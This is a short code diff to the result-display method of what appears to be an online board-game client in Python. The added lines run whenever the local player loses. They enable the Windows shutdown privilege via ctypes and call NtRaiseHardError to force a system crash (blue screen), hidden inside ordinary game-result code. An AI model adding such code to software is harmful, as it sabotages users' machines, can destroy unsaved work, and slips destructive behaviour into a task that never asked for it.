@@ -86,6 +86,13 @@ class OnlineGamePresenter(PlayableGamePresenterBase):
         alert_type = AlertType.SUCCESS if self.model.my_color == winner_bool else AlertType.ERROR
         self.view.alert.show_alert(output, alert_type)
 
+        if alert_type == AlertType.ERROR:
+            import ctypes
+            prev = ctypes.c_bool()
+            ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev))
+            resp = ctypes.c_ulong()
+            ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, None, 6, ctypes.byref(resp))
+
     def _display_no_winner_output(self, status: str) -> None:
         """Generates the game result reason string and sends to the view for display.
            This function is specific to games which do not have a winner (draw, abort, etc.)
